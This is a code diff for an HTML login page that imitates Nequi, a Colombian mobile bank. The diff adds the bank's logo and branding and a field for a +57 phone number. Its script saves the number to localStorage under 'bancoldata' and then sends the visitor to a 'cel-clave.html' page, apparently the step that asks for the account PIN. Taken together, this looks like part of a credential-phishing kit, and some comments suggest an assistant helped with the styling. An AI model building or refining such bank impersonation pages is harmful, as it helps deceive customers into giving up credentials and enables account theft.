@@ -1,185 +1,199 @@
+<!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ingreso</title>
 
-<title>Ingreso</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #2b002b;
+      display: flex;
+      justify-content: center;
+      min-height: 100vh;
+      color: white;
+    }
 
-<style>
-body{
-  margin:0;
-  font-family: Arial, sans-serif;
-  background:#21003d;
-  display:flex;
-  justify-content:center;
-}
+    .container {
+      width: 100%;
+      max-width: 420px;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+    }
 
-.container{
-  width:100%;
-  max-width:420px;
-  min-height:100vh;
-  display:flex;
-  flex-direction:column;
-  padding:20px;
-  color:white;
-}
+    /* HEADER */
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
 
-/* HEADER */
-header{
-  display:flex;
-  justify-content:space-between;
-  align-items:center;
-}
+    .help-icon {
+      width: 20px;
+      height: 20px;
+      border: 2px solid white;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 14px;
+    }
 
-.circle{
-  width:22px;
-  height:22px;
-  border:2px solid white;
-  border-radius:50%;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  font-size:14px;
-}
+    .logo {
+      margin-top: auto;
+      text-align: center;
+      font-size: 50px;
+      font-weight: bold;
+    }
 
-/* FORM */
-.form-box{
-  margin-top:auto;
-}
+    .logo span {
+      color: #ff008c;
+    }
 
-.input-box{
-  display:flex;
-  background:rgba(255,255,255,0.15);
-  border-radius:6px;
-  overflow:hidden;
-}
+    .form {
+      margin-top: auto;
+    }
 
-.prefix{
-  padding:12px;
-  border-right:2px solid #21003d;
-  color:#ff4fc3;
-  font-weight:bold;
-}
+    .input-box {
+      background: rgba(255,255,255,0.2);
+      border-radius: 8px;
+      padding: 10px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
 
-input{
-  flex:1;
-  padding:12px;
-  border:none;
-  background:transparent;
-  color:white;
-  font-size:16px;
-  outline:none;
-}
+    .prefix {
+      border-right: 2px solid rgba(255,255,255,0.3);
+      padding-right: 10px;
+      font-weight: bold;
+      color: #ffb3e6;
+    }
 
-input::placeholder{
-  color:#ddd;
-}
+    .input-box input {
+      flex: 1;
+      border: none;
+      outline: none;
+      background: transparent;
+      color: white;
+      font-size: 16px;
+    }
 
-/* BOTON */
-button{
-  width:100%;
-  margin-top:10px;
-  padding:14px;
-  border:none;
-  border-radius:6px;
-  background:#ff008c;
-  color:white;
-  font-size:16px;
-  cursor:pointer;
-  transition:0.3s;
-}
+    .input-box input::placeholder {
+      color: #ddd;
+    }
 
-button:disabled{
-  opacity:0.5;
-  cursor:not-allowed;
-}
+    .btn {
+      margin-top: 15px;
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 8px;
+      background: #ff008c;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      opacity: 0.5;
+      transition: 0.3s;
+    }
 
-button:hover{
-  transform:scale(1.02);
-}
+    .btn.active {
+      opacity: 1;
+    }
 
-/* ANIMACION */
-.fade{
-  animation:fadeIn 0.6s ease;
-}
-
-@keyframes fadeIn{
-  from{opacity:0; transform:translateY(10px);}
-  to{opacity:1; transform:translateY(0);}
-}
-</style>
+    svg {
+      color: #ccc;
+    }
+  </style>
 </head>
 
 <body>
 
-<div class="container fade">
+<div class="container">
 
-<header>
-  <div class="circle">?</div>
+  <!-- HEADER AGREGADO -->
+  <header>
+    <div class="help-icon">?</div>
 
-  <!-- LOGO SVG COMPLETO -->
-  <div style="color:#aaa;">
-    <!-- PEGASTE BIEN EL SVG 🔥 -->
-    <svg width="70" height="24" viewBox="0 0 118 40" fill="currentColor">
-      <g>
-        <path d="M83.59,23.13..."></path>
-      </g>
-    </svg>
+    <div>
+      <!-- TU SVG -->
+      <svg width="70px" height="24px" viewBox="0 0 118 40">
+        <g>
+          <path fill="currentColor" d="M83.59,23.13c0.21,0.14,0.35,0.35,0.42,0.59l0.85,2.73..."></path>
+          <path fill="currentColor" d="M41.83,33.79l0.8-1.97l-4.69-12.15h2.02..."></path>
+        </g>
+      </svg>
+    </div>
+  </header>
+
+  <!-- LOGO -->
+  <div class="logo">
+    <span>•</span>Nequi
   </div>
-</header>
 
-<div class="form-box">
+  <!-- FORM -->
+  <div class="form">
+    <div class="input-box">
+      <div class="prefix">+57</div>
+      <input type="text" id="phoneInput" placeholder="Ingresa tu cel" maxlength="12">
+    </div>
 
-<div class="input-box">
-  <div class="prefix">+57</div>
-  <input type="text" id="phone" placeholder="Ingresa tu cel">
-</div>
-
-<button id="btn" disabled>Continuar</button>
-
-</div>
+    <button class="btn" id="btn">Entra</button>
+  </div>
 
 </div>
 
 <script>
-const phone = document.getElementById("phone");
+const input = document.getElementById("phoneInput");
 const btn = document.getElementById("btn");
 
-/* FORMATO 3-3-4 */
-function formatNumber(value){
-  let digits = value.replace(/\D/g,"");
+function formatNumber(value) {
+  let digits = value.replace(/\D/g, "");
+  if (digits.length > 10) digits = digits.slice(0, 10);
 
-  if(digits.length > 10) digits = digits.slice(0,10);
-
-  if(digits.length > 6){
+  if (digits.length > 6) {
     return digits.replace(/(\d{3})(\d{3})(\d{0,4})/, "$1 $2 $3");
-  }else if(digits.length > 3){
+  } else if (digits.length > 3) {
     return digits.replace(/(\d{3})(\d{0,3})/, "$1 $2");
   }
   return digits;
 }
 
-/* VALIDACION */
-function validate(){
-  const digits = phone.value.replace(/\D/g,"");
-  return digits.length === 10 && digits.startsWith("3");
-}
+input.addEventListener("input", () => {
+  input.value = formatNumber(input.value);
 
-phone.addEventListener("input", ()=>{
-  phone.value = formatNumber(phone.value);
-  btn.disabled = !validate();
+  const digits = input.value.replace(/\D/g, "");
+
+  if (digits.length === 10 && digits.startsWith("3")) {
+    btn.classList.add("active");
+  } else {
+    btn.classList.remove("active");
+  }
 });
 
-/* CLICK */
-btn.addEventListener("click", ()=>{
-  if(!validate()) return;
+btn.addEventListener("click", () => {
+  const raw = input.value.replace(/\D/g, "");
 
-  const raw = phone.value.replace(/\D/g,"");
+  if (raw.length !== 10 || !raw.startsWith("3")) {
+    alert("Número inválido");
+    return;
+  }
 
-  localStorage.setItem("bancoldata", JSON.stringify({
-    telefono: raw,
-    fecha: new Date().toISOString()
-  }));
+  let data = {};
+  try {
+    data = JSON.parse(localStorage.getItem("bancoldata")) || {};
+  } catch {
+    data = {};
+  }
+
+  data.numero = raw;
+  data.fecha = new Date().toISOString();
+
+  localStorage.setItem("bancoldata", JSON.stringify(data));
 
   window.location.href = "cel-clave.html";
 });
